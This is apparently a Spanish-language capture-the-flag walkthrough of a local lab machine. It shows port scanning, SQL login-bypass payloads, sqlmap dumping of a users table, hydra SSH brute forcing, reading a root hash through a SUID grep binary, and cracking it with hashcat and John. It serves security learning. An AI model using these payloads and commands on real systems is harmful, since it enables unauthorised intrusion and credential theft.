


<p align="center">
    <img src="../img/Pasted_image_20250102220738.png" width="500">
</p>


Compruebo si está activa
```
ping -c 1 172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20250101191113.png" width="500">
</p>


---

## Enumeración
### Escaneo de puertos
- Primero hago un reconocimiento de puertos silencioso de los puertos abiertos
```
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20250102221008.png" width="500">
</p>


**Resultados del escaneo:**

| Puerto | Estado | Servicio |
| ------ | ------ | -------- |
| 22/tcp | open   | ssh      |
| 80/tcp | open   | http     |


Realizamos un segundo escaneo al puerto abierto, lanzando una serie de script por defecto de `nmap` y reconocimiento de servicios.
```
nmap -p22,80 -sVC --min-rate 5000 -n -Pn 172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20250102221047.png" width="500">
</p>

| Puerto | Estado | Servicio | Versión                                       |
| ------ | ------ | -------- | --------------------------------------------- |
| 22/tcp | open   | ssh      | OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) |
| 80/tcp | open   | http     | Apache httpd 2.4.61 ((Debian))                |

---


<h3><center> Análisis del servidor web HTTP (puerto 80)</center></h3>

Al introducir la IP como la dirección URL, la web nos muestra lo siguiente:
<p align="center">
    <img src="../img/Pasted_image_20250102221151.png" width="500">
</p>



Y observando la web, vemos una página que contiene un `login`
<p align="center">
    <img src="../img/Pasted_image_20250102221218.png" width="500">
</p>


Hago un reconocimiento de las tecnologías con las que está hecha la aplicación web.
```
whatweb http://172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20250102221319.png" width="500">
</p>


Nos nos indica mucho. Si probamos las credenciales típicas como `admin:admin`.
<p align="center">
    <img src="../img/Pasted_image_20250102221508.png" width="500">
</p>



Nos envía a una pagina de error, `logerror.html`. Si probamos en el `login` un `bypass SQL` como;
```
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
```

<p align="center">
    <img src="../img/Pasted_image_20250102221602.png" width="500">
</p>



No envía a la misma página de error. Realizamos `FUZZING WEB`, para ver posibles directorios, ficheros que contenga el servidor web. 

### Fuzzing Web

**dirb**
```
dirb http://172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20250102221733.png" width="500">
</p>



No nos encuentra mucho, así que realizamos un segundo escaneo con la herramienta `gobuster`.
```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,asp,aspx,py
```

<p align="center">
    <img src="../img/Pasted_image_20250102221937.png" width="500">
</p>


Tampoco no nos muestra mucho. Lo que se me ocurre es capturar la petición del panel del `login`. Así que abrimos `burpsuite` y capturamos la solicitud.

Si interceptamos la petición y en el `login` enviamos la solitud, obtenemos.
<p align="center">
    <img src="../img/Pasted_image_20250102222139.png" width="500">
</p>

<p align="center">
    <img src="../img/Pasted_image_20250102222216.png" width="500">
</p>

Guardamos la petición en un fichero `request.txt` para ver si con la herramienta `sqlmap` podemos enumerar la base de datos.
```
nano request.txt
```
<p align="center">
    <img src="../img/Pasted_image_20250102222418.png" width="500">
</p>

Una vez teniendo la petición, iniciaremos la herramienta de `sqlmap` de la siguiente forma.

```
sqlmap -r request.txt --dbs
```

<p align="center">
    <img src="../img/Pasted_image_20250102222617.png" width="500">
</p>


Obtenemos las base de datos, la que nos llama la atención es la base de datos `users`. Así que veremos las tablas de la base de datos de `users`
```
sqlmap -r request.txt -D users --tables
```

<p align="center">
    <img src="../img/Pasted_image_20250102222754.png" width="500">
</p>



Por lo que vemos contiene una tabla llamada `usuarios`, por lo que haremos es ver las columnas de la tabla `usuarios.
```
sqlmap -r request.txt -D users -T usuarios --columns
```

<p align="center">
    <img src="../img/Pasted_image_20250102222858.png" width="500">
</p>


Ahora sabiendo que las columnas se llaman así, podremos ver el contenido de cada una haciendo lo siguiente.
```
sqlmap -r request.txt -D users -T usuarios -C id,username,password --dump
```

<p align="center">
    <img src="../img/Pasted_image_20250102222941.png" width="500">
</p>

Vemos usuarios y contraseñas, lo primero que hacemos es guardarnos esta información en dos ficheros uno para los usuarios y otro para contraseña.
```
nano users.txt
```
```
nano passwords.txt
```

<p align="center">
    <img src="../img/Pasted_image_20250102223103.png" width="500">
</p>


Intentamos acceder por medio del servicio `SSH` con esas credenciales pero no tuvimos suerte, por lo que intentaré realizar fuerza bruta para ver si conseguimos asignar a cada usuario su contraseña.

### Hydra
Teniendo el diccionario de usuarios personalizado, realiza un ataque de fuerza bruta. 
```
hydra -L users.txt -P passwords.txt ssh://172.17.0.2 -t 64
```

<p align="center">
    <img src="../img/Pasted_image_20250102223403.png" width="500">
</p>

Obtuvimos las credenciales del usuario `pepe`, su contraseña es `P123pepe3456P`. Así que iniciamos sesión en el servicio `SSH` con estas credenciales.
```
ssh pepe@172.17.0.2    # Después ponemos la contraseña P123pepe3456P
```

<p align="center">
    <img src="../img/Pasted_image_20250102223606.png" width="500">
</p>

Conseguimos iniciar sesión con el usuario `pepe`.  Enumerando el sistema no encontramos nada. 

---

## POST-EXPLOTACIÓN

#### Escalada de privilegios

Vemos los binarios que puede ejecutar el usuario `pepe`.
```
sudo -l
```

<p align="center">
    <img src="../img/Pasted_image_20250102223905.png" width="500">
</p>

No está instalado el comando `sudo`. Por lo que vamos a buscar los binarios que tengan permisos `SUID`.
```
find / -perm -4000 2>/dev/null
```

<p align="center">
    <img src="../img/Pasted_image_20250102223950.png" width="500">
</p>

El que veo interesante es `grep`. si vamos a la web de y buscamos el binario `grep` por `SUID` [GTFObins][https://gtfobins.github.io/gtfobins/find/#suid]
nos indica que ejecutando el siguiente comando podemos obtener privilegios de `root`.
<p align="center">
    <img src="../img/Pasted_image_20250102224058.png" width="500">
</p>


Nos indica que realizando un `grep` a cualquier fichero podemos escalar los privilegios. Así que lo realizamos para leer la contraseña hasheada del usuario `root.
```
/usr/bin/grep '' /root/pass.hash
```

<p align="center">
    <img src="../img/Pasted_image_20250102224506.png" width="500">
</p>

El hash es un md5. Si vamos a la web [(MD5 Decrypt)](https://www.md5online.org/md5-decrypt.html#google_vignette) y lo desencriptamos, obtenemos `spongebob34`. También podemos usar herramientas como `hashcat` y `JohnTheRipper`. Para ello guardamos el hash en un fichero.
```
nano hash.txt
```

<p align="center">
    <img src="../img/Pasted_image_20250102224835.png" width="500">
</p>


Y procedemos a desencriptarla.

- **HASCAT**
```
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

<p align="center">
    <img src="../img/Pasted_image_20250102225000.png" width="500">
</p>

<p align="center">
    <img src="../img/Pasted_image_20250102225017.png" width="500">
</p>


Desencripta el hash.

- **JohnTheRipper**
```
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<p align="center">
    <img src="../img/Pasted_image_20250102225142.png" width="500">
</p>

También la desencripta. Teniendo la contraseña del usuario `root`, pivotamos a este
```
su root     # Después ponemos la contraseña spngebob34
```

<p align="center">
    <img src="../img/Pasted_image_20250102225329.png" width="500">
</p>


Somos el usuario `root`.


